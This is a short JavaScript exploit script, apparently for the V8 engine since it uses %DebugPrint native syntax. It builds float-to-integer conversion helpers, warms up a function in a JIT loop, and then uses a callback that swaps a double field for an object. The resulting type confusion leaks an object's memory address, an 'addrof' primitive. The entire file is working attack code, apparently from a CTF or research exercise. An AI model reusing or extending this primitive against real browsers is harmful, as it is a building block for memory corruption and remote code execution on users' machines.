function hex(x)
{
	return '0x' + (x.toString(16)).padStart(16, 0);
}

function success(str, val){
    console.log("[+] " + str + " -> "+ hex(val));
}

class typeConvert
{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    f2u(val){        //double ==> Uint64
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){        //Uint64 ==> double
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

var tC = new typeConvert();

var obj = {x:1.1, y:2.2};
let o = {a: 3.3, b: 4.4};


// trigger func
function triggerFunc(o,callback){
	var tmp = o.a;
	//%DebugPrint(o);
	callback();
	return o.b;
}

function usable(){
	//%DebugPrint(o);
	o.b = obj;
	//%DebugPrint(o);
	//%SystemBreak();
}
// console.log(triggerFunc(o,()=>1));
for(let i=0; i<0x12000; i++){
	triggerFunc(o, () => 0);
	triggerFunc(o, () => 0);
}


let objLeakAddr = tC.f2u(triggerFunc(o,usable));
success("objLeakAddr",objLeakAddr);
%DebugPrint(obj);


